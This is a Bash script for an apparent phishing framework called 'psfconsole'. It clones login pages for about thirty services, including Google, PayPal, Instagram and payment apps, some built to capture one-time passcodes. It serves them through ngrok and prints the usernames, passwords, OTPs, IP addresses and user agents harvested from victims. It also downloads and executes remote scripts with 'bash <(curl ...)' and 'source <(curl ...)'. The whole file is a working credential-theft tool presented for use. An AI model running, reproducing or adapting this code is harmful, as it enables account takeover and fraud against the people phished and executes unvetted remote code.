#!/bin/bash

__return__ () {
source __return__ &> /dev/null
if [[ ! $? == 105 ]]
then
printf 105
fi
}

__return__=$(printf "$(__return__)")

WAIT() {
sleep 0.01
}

OS=$(uname -o | grep -o "Android")

declare -a SITES=(
Google
Facebook
Microsoft
Instagram
DeviantArt
Pinterest
Badoo
Twitch
Snapchat
Ebay
Linkedin
DropBox
Netflix
Mediafire
Gitlab
Github
Yahoo
Paypal
Quora
Wordpress
Steam
Yandex
Twitter
Spotify
StackoverFlow
Playstation
Reddit
Tiktok
Adobe
Xbox
)

declare -a SITESX=(
'Google.OTP'
'Facebook.OTP'
'Instagram.OTP'
'Pinterest.OTP'
'Amazon.OTP'
'Twitch.OTP'
'Snapchat.OTP'
'Ebay.OTP'
'Linkedin.OTP'
'Netflix.OTP'
'Paytm.OTP'
'Gitlab.OTP'
'CryptoCurrency.OPT'
'Instafollow.OTP'
'Protonmail.OTP'
'Yahoo.OTP'
'Paypal.OTP'
'Telegram.OTP'
'Mobikwik.OTP'
'Wordpress.OTP'
'Hotstar.OTP'
'Flipkart.OTP'
'Twitter.OTP'
'Spotify.OTP'
'Phonepay.OTP'
'StackoverFlow.OTP'
'WhatsApp.OTP'
'Tiktok.OTP'
'Ajio.OTP'
'Uber.OTP'
)

export OUTPUT=$HOME/.history.psf
WEBPAGEX=${#SITESX[@]}
WEBPAGE=${#SITES[@]}
CWD=$(pwd)
VAR=4.4
ARG=$1
NUM=1

C0="$(printf '\033[90m')"
C1="$(printf '\033[91m')"
C2="$(printf '\033[92m')"
C3="$(printf '\033[93m')"
C4="$(printf '\033[94m')"
C5="$(printf '\033[95m')"
C6="$(printf '\033[96m')"
C7="$(printf '\033[97m')"
R0="$(printf '\033[0m')"
R1="$(printf '\033[1m')"
R2="$(printf '\033[2m')"
R3="$(printf '\033[3m')"
R4="$(printf '\033[4m')"
R5="$(printf '\033[5m')"

function screenSize() {
    if ! hash tput &> /dev/null
    then
    apt install -y ncurses-utils
    fi

      SIZE=$(tput cols)

                if [ ! ${SIZE} -gt "60" ]
                then
                printf "\nYour Terminal window Size must be above ${C2}60${R0} >= ${C1}${SIZE}${R0}\nPinch two fingers together on the screen to zoom out.\n"
                fi
}

if [[ $OS == *'Android'* ]];then
screenSize
TMPDIR=/data/data/com.termux/files/usr/tmp
pm() {
apt install -y $1
}
else
TMPDIR=/tmp
# Package Managers
    distro=$(source /etc/os-release && echo $ID)
    case $distro in
        arch)
            pm() {
		sudo pacman -Sy --noconfirm $1
		}
            ;;
        ubuntu)
            pm() {
		sudo apt-get install -y $1
		}
            ;;
        linuxmint)
            pm() { sudo apt-get install -y $1
		}
            ;;
        kali)
            pm() { sudo apt-get install -y $1
		}
            ;;
        parrot)
            pm() { sudo apt-get install -y $1
		}
            ;;
        debian)
            pm() { sudo apt-get install -y $1
		}
            ;;
        void)
            pm() { sudo xbps-install $1
		}
            ;;
        manjaro)
            pm() { sudo pacman -Sy $1
		}
            ;;
        garuda)
            pm() { sudo pacman -Sy $1
		}
            ;;
        alpine)
            pm() { sudo apk add $1
		}
            ;;
        gentoo)
            pm() { sudo emerge --ask $1
		}
            ;;
        fedora)
            pm() { sudo dnf install -y $1
		}
            ;;
        predator)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        artix)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        puppy_fossapup64)
            pm() { sudo pkg -i $1
		}
            ;;
        raspbian)
            pm() { sudo apt install -y $1
		}
            ;;
        endeavouros)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        freebsd)
            pm() { sudo pkg install -y $1
		}
            ;;
        *)
          echo "Sorry, but your System doesn't support [package manager] !"
          # Add manualy to use package manager to start psfconsole !
            exit 0
            ;;
    esac
fi

if ! hash svn &> /dev/null
then
pm subversion
elif ! hash php &> /dev/null
then
pm php
elif ! hash git &> /dev/null
then
pm git
elif ! hash jq &> /dev/null
then
pm jq
elif ! hash curl &> /dev/null
then
pm curl
fi

interrupt () {
exit_on_signal_SIGINT () {
if [[ ! $__return__ == 105 ]];then
if [[ ${ARG} == "-s" ]];then
if [[ ${SITENUM} == ${SITENUM} ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITENUM}" &> /dev/null
fi
else
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
rm -rf "${SCRIPT_PATH[@]}"/"${SITESX[${input} -1]}" &> /dev/null
fi
printf "                                            \r"
echo -e "${C1}(${R0}>${C1})${R0} Interrupt program !"
exit 0
else
printf "                                            \r"
echo -e "${C1}(${R0}>${C1})${R0} Interrupt program !"
exit 0
fi
}

exit_on_signal_SIGTSTP () {
if [[ ! $__return__ == 105 ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
if [[ ${ARG} == "-s" ]];then
if [[ ${SITENUM} == ${SITENUM} ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITENUM}" &> /dev/null
fi
else
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
rm -rf "${SCRIPT_PATH[@]}"/"${SITESX[${input} -1]}" &> /dev/null
fi
printf "                                            \r"
echo -e "${C1}(${R0}>${C1})${R0} Interrupt program !"
exit 0
else
printf "                                            \r"
echo -e "${C1}(${R0}>${C1})${R0} Interrupt program !"
exit 0
fi
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTSTP SIGTSTP
}

# <<<--- Help Mode --->>>

helpCOMMANDS () {
echo -e "
Available Commands
================

    Command     Description
    -------     -----------
    use         This command to call a exist modules.
    list        Launch an list menu of phising templates.
    exit        Exit Phising Framework instant.
    clear       Clear unwanted logs.
    banner      Show a Random banner.

    Available Module        Description
    -------------------     -----------
    use non:otp/handler     module for run non:otp phishing sites.
    use with:otp/handler    module for run with:otp phishing sites.

    Upcomming Module        Description
    --------------------    -----------
    use with:gps/handler    With the module to craete geolocation phishing site.


psfconsole
==========

\`psfconsole\` is a bundle of phising sites interface to Phising Framework.
There is quite a lot that needs go here, please be patient and keep an eye on this space!
"
# upcomming module
# use with:otp/handler    module for run with:otp phishing sites.
}

# <<<--- Installer --->>>

if [[ ${ARG} == "-i" || ${ARG} == "--install" ]];then
source <(curl -sLo- "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/setup.psfconsole")
exit 0

elif [[ ${ARG} == "-u" || ${ARG} == "--update" ]];then
source <(curl -sLo- "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/update.psfconsole")
exit 0

elif [[ ${ARG} == "-r" || ${ARG} == "--remove" ]];then
source <(curl -sLo- "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/remove.psfconsole")
exit 0
fi

user_data() {
#random_ip=$(shuf -i 0-1 -n 1)
if [ -f "ip.txt" ]
then
ip=$(cat ip.txt | awk NR==2 | cut -d " " -f2)
fetch=$(cat ip.txt | awk NR==3)
user=$(printf "${fetch# User-Agent:}")

echo -e "${C2}(${R0}>${C2})${R0} IP Address : ${ip}"
echo -e "${C2}(${R0}>${C2})${R0} User Agent :${user}\n"
fi
rm ip.txt &> /dev/null
}

credentialsX() {
user=$(grep -o 'Username:.*' log.txt | awk NR==1 | cut -d " " -f2)
pass=$(grep -o 'Pass:.*' log.txt | awk NR==1 | cut -d ":" -f2)
otp=$(grep -o 'OTP:.*' log.txt | awk NR==1 | cut -d " " -f2)

if [[ ! ${#user} == 0 ]]
then
echo -e "${C2}(${R0}>${C2})${R0} Username : ${user}"
fi

if [[ ! ${#pass} == 0 ]]
then
if [[ ! ${pass} == " " ]]
then
echo -e "${C2}(${R0}>${C2})${R0} Password :${pass}"
fi
fi

if [[ ! ${#otp} == 0 ]]
then
if [[ ! ${otp} == " " ]]
then
echo -e "${C2}(${R0}>${C2})${R0} Otp :${otp}\n"
fi
fi
rm log.txt &> /dev/null
}

function credentialLoopX () {
while true
do
if [ -f "ip.txt" ]
then
user_data
fi
if [ -f "log.txt" ]
then
credentialsX
fi
done
}

credentials() {
user=$(grep -o 'Username:.*' usernames.txt | awk NR==1 | cut -d " " -f2)
pass=$(grep -o 'Pass:.*' usernames.txt | awk NR==1 | cut -d ":" -f2)

if [[ ! ${#user} == 0 ]]
then
echo -e "${C2}(${R0}>${C2})${R0} Username : ${user}"
fi

if [[ ! ${#pass} == 0 ]]
then
if [[ ! ${pass} == " " ]]
then
echo -e "${C2}(${R0}>${C2})${R0} Password :${pass}\n"
fi
fi
rm usernames.txt &> /dev/null
}

function credentialLoop () {
while true
do
if [ -f "ip.txt" ]
then
user_data
fi
if [ -f "usernames.txt" ]
then
credentials
fi
done
}


# <<<--- Argument Mode ! --->>>

if [[ ${ARG} == "-s" || ${ARG} == "--site" ]];then
  if [[ ${2} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
   then
      if [[ ${2} -lt 31 ]]
       then interrupt
       SITENUM="${SITES[${2} -1]}"
       echo -e "${C4}(${R0}>${C4})${R0} Webpage : ${SITENUM}"
       if [[ ! $__return__ == 105 ]];then
       cd ${CWD}/server
       SCRIPT_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
       cd - &> /dev/null
       bash ${CWD}/programs/ngrok.installer
       source ${CWD}/programs/ngrok.configure
       cp -rf  "${CWD}"/websites/nonOTP/"${SITES[${2} -1]}" "${CWD}/server"
       cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${SITES[${2} -1]}"
       cd "${SCRIPT_PATH[@]}"/"${SITES[${2} -1]}"
       php -S localhost:8080 > /dev/null 2>&1 &
       echo -e "\n${C4}(${R0}>${C4})${R0} Credentials details visible here !\n"
       credentialLoop
       else
       cd $TMPDIR
       if [ ! -d "$TMPDIR/server" ]
       then
       mkdir -p ${TMPDIR}/server
       fi
       cd server
       if [[ ! -d "${SITES[${2} -1]}" ]]
       then
       printf "${C4}(${R0}>${C4})${R0} Downloading webpage Template...\r"
       svn checkout https://github.com/abhackerofficial/phising-framework/trunk/websites/nonOTP/"${SITES[${2} -1]}" &> /dev/null
       fi
       cd ..
       cd ${TMPDIR}/server/"${SITES[${2} -1]}"
       printf "${C4}(${R0}>${C4})${R0} Downloading Programs for Starting Server...\r"
       curl -sLO https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/server/ip.php
       cd - &> /dev/null
       bash <(curl -sL "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.installer")
       source <(curl -sLo- "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.configure")
       cd ${TMPDIR}/server/"${SITES[${2} -1]}"
       php -S localhost:8080 > /dev/null 2>&1 &
       echo -e "\n${C4}(${R0}>${C4})${R0} Credentials details visible here !\n"
       credentialLoop
      fi
  fi
  else
  echo "(>) Choose Site as given Number !"
  exit 1
fi
exit 0
fi

randomBANNER() {
RANDOMs=$(echo $((1 + $RANDOM % 8)))
if [[ ! $__return__ == 105 ]];then
bash assets/logos/logo.${RANDOMs}
else
bash <(curl -sL "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/assets/logos/logo.${RANDOMs}")
fi
}

randomTIP() {
RANDOMs=$(echo $((1 + $RANDOM % 2)))

case ${RANDOMs} in
1)
       printf "Psfconsole tip: When in a module, use ${C2}back${R0} to go\n";WAIT
       printf "back to the top level prompt\n\n";WAIT
       ;;
2)
       printf "Psfconsole tip: You can use ${C2}help${R0} to view all\n";WAIT
       printf "available commands and modules.\n\n";WAIT
       ;;
esac
}

theHEADER() {
randomBANNER
printf "+ -- --=[  ${C3}psfconsole release v${VAR}${R0} ]=-- -- +\n";WAIT
printf "+ -- --=[  ${C2}${WEBPAGE} webpage - templates${R0}  ]=-- -- +\n\n";WAIT
randomTIP
}

theHEADER

list() {
echo
for i in {0..8}
  do
  printf "${C4}(${R0}0$((i+1))${C4})${R0} ${SITES[i]}\n"
  WAIT
done

for i in {9..29}
  do
  printf "${C4}(${R0}$((i+1))${C4})${R0} ${SITES[i]}\n"
  WAIT
done
echo
}

listx() {
echo
for i in {0..8}
  do
  printf "${C4}(${R0}0$((i+1))${C4})${R0} ${SITESX[i]}\n"
  WAIT
done

for i in {9..29}
  do
  printf "${C4}(${R0}$((i+1))${C4})${R0} ${SITESX[i]}\n"
  WAIT
done
echo
}


withOTP() {
function setupRecourses () {
if [[ ! $__return__ == 105 ]];then
   cd ${CWD}/server
   SCRIPT_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
   cd - &> /dev/null
   bash ${CWD}/programs/ngrok.installer
   source ${CWD}/programs/ngrok.configure
else
   cd $TMPDIR
   if [ ! -d "$TMPDIR/server" ]
   then
   mkdir -p ${TMPDIR}/server
   fi
   cd server
   if [[ ! -d "${SITESX[${input} -1]}" ]]
   then
   printf "${C4}(${R0}>${C4})${R0} Downloading webpage Template...\r"
   svn checkout https://github.com/abhackerofficial/phising-framework/trunk/websites/withOTP/"${SITESX[${input} -1]}" &> /dev/null
   fi
   cd ..
   cd ${TMPDIR}/server/"${SITESX[${input} -1]}"
   printf "${C4}(${R0}>${C4})${R0} Downloading Programs for Starting Server...\r"
   curl -sLO https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/server/ip.php
   cd - &> /dev/null
   bash <(curl -sL "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.installer")
   source <(curl -sLo- "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.configure")
fi
}

function setupServer () {
if [ ${#link} == 0 ]
then
exit 1
fi
sleep 0.5

if [[ ! $__return__ == 105 ]];then
cp -rf  "${CWD}"/websites/withOTP/"${SITESX[${input} -1]}" "${CWD}/server"
cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${SITESX[${input} -1]}"
cd "${SCRIPT_PATH[@]}"/"${SITESX[${input} -1]}"
else
cd ${TMPDIR}/server/"${SITESX[${input} -1]}"
fi
}

function startServer () {
php -S localhost:8080 > /dev/null 2>&1 &
echo -e "\n${C4}(${R0}>${C4})${R0} Credentials details visible here !\n"
}


# <<<--- Input Mode ! --->>>

if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
then
  if [[ ${input} -lt 31 ]]
   then
       setupRecourses
       setupServer
       startServer
       credentialLoopX
  fi
fi
}


nonOTP() {
function setupRecourses () {
if [[ ! $__return__ == 105 ]];then
   cd ${CWD}/server
   SCRIPT_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
   cd - &> /dev/null
   bash ${CWD}/programs/ngrok.installer
   source ${CWD}/programs/ngrok.configure
else
   cd $TMPDIR
   if [ ! -d "$TMPDIR/server" ]
   then
   mkdir -p ${TMPDIR}/server
   fi
   cd server
   if [[ ! -d "${SITES[${input} -1]}" ]]
   then
   printf "${C4}(${R0}>${C4})${R0} Downloading webpage Template...\r"
   svn checkout https://github.com/abhackerofficial/phising-framework/trunk/websites/nonOTP/"${SITES[${input} -1]}" &> /dev/null
   fi
   cd ..
   cd ${TMPDIR}/server/"${SITES[${input} -1]}"
   printf "${C4}(${R0}>${C4})${R0} Downloading Programs for Starting Server...\r"
   curl -sLO https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/server/ip.php
   cd - &> /dev/null
   bash <(curl -sL "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.installer")
   source <(curl -sLo- "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.configure")
fi
}

function setupServer () {
if [ ${#link} == 0 ]
then
exit 1
fi
sleep 0.5

if [[ ! $__return__ == 105 ]];then
cp -rf  "${CWD}"/websites/nonOTP/"${SITES[${input} -1]}" "${CWD}/server"
cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}"
cd "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}"
else
cd ${TMPDIR}/server/"${SITES[${input} -1]}"
fi
}

function startServer () {
php -S localhost:8080 > /dev/null 2>&1 &
echo -e "\n${C4}(${R0}>${C4})${R0} Credentials details visible here !\n"
}


# <<<--- Input Mode ! --->>>

if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
then
  if [[ ${input} -lt 31 ]]
   then
       setupRecourses
       setupServer
       startServer
       credentialLoop
  fi
fi
}

function psfHISTORY () {
NUM=1

if [[ ! -f $OUTPUT ]]
 then
 touch $OUTPUT
fi

LOG=$(wc -l ${OUTPUT} | awk '{ print $1 }')

i=1

while [ $i -le ${LOG} ]
do
  printf "...\n" >> fetch.db
((i++))
done

if [ -f "fetch.db" ]
then
declare -a LOGS=(
$(cat fetch.db)
)
fi

historyLOOP() {
for i in "${LOGS[@]}"
  do
  KEY=$(printf "%02d" $NUM)
  LOOP=$((${LOOP:-0}+1))
  FILE=$(cat "$OUTPUT" | awk NR==${LOOP})
  history -s "${FILE}"
  ((NUM++))
  rm fetch.db &> /dev/null
  done
}
  historyLOOP
  LOOP=0
}

psf() {
psfHISTORY
#read -e -p $'\e[4mpsf\e[0m > \e[0m' command
read -e -p  "psf > " command
if [ ${#command} -gt 0 ]
then
if [[ $(cat ${OUTPUT}) == *"${command}"* ]]
then
sed -i '/'"${command}"'/d' $OUTPUT &> /dev/null
echo "${command}" >> $OUTPUT
else
echo "${command}" >> $OUTPUT
fi
fi
}

showERROR() {
echo -e "${C1}(${R0}>${C1})${R0} Unsatisfied command ‘$1’ :: execute '?'/'help'"
}

showHISTORY() {
while IFS= read -r line; do
    LOOP=$((${LOOP:-0}+1))
    printf "${LOOP}  $line\n"
done < "$OUTPUT"
LOOP=0
}

ignoreERROR() {
if [[ ${input} == "?" || ${input} == "help" ]]
then
   :

elif [[ ${input} == "back" ]]
then
   :

elif [[ ${input} == "banner" ]]
then
   :

elif [[ ${input} == "exit" ]]
then
   :

elif [[ ${input} == "clear" ]]
then
   :

else
  showERROR $input
  fi
}

theERROR() {
command="$command"
  if [ ${#command} -gt 0 ]
   then
      showERROR $command
  fi

input="$input"


if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
 then
  if [[ ! ${input} -lt "31" ]]
     then
      ignoreERROR
  fi
else
   if [[ ${#input} -gt 0 ]]
   then
      ignoreERROR
   fi
fi
}

getCOMMANDS() {
  if [[ ${command} == "use with:otp/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use non:otp/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "?" || ${command} == "help" ]]
   then
      helpCOMMANDS
      command=""

elif [[ ${command} == "banner" ]]
   then
      theHEADER
      command=""

elif [[ ${command} == "list" ]]
   then
      echo -e "${C2}(${R0}>${C2})${R0} 'list' command only works with Modules! :: execute '?'/'help'"
      command=""

  elif [[ ${command} == "exit" ]]
   then
      echo -e "${C2}(${R0}>${C2})${R0} Existing psfconsole..."
      exit 0
      command=""

  elif [[ ${command} == "clear" ]]
   then
      clear
      command=""

elif [[ ${command} == "history" ]]
      then
          showHISTORY
          command=""
  fi
}

extarnalCMD() {
  if [[ ${input} == "?" || ${input} == "help" ]]
   then
       helpCOMMANDS

   elif [[ ${input} == "back" ]]
      then
while true
do
         readCOMMAND
done
elif [[ ${input} == "banner" ]]
      then
         theHEADER

elif [[ ${input} == "exit" ]]
      then
         echo -e "${C2}(${R0}>${C2})${R0} Existing psfconsole..."
         exit 0

elif [[ ${input} == "clear" ]]
      then
         clear
  fi
}

readCONFIGURE () {
  if [[ ${command} == "use with:otp/handler" ]]
  then
     echo -e "${C4}(${R0}>${C4})${R0} Using configured with:otp mode"
#     listx
     while true
     do
     printf "${R4}psf${R0} use(${C1}webpage/with:otp${R0})${R0} > "
     read input
     command=""
     theERROR
if [[ ${input} == "list" ]]
 then
    listx
fi

     extarnalCMD
     withOTP
     done

  elif [[ ${command} == "use non:otp/handler" ]]
  then
     echo -e "${C4}(${R0}>${C4})${R0} Using configured non:otp mode"
#     list
     while true
     do
     printf "${R4}psf${R0} use(${C1}webpage/non:otp${R0})${R0} > "
     read input
     command=""
     theERROR
if [[ ${input} == "list" ]]
 then
    list
fi

     extarnalCMD
     nonOTP
     done
  fi
}

readCOMMAND() {
interrupt
while true
do
psf
getCOMMANDS
if [[ ${TRUE} == "true" ]]
then
  break & readCONFIGURE
fi
input=""
theERROR
done
}

readCOMMAND
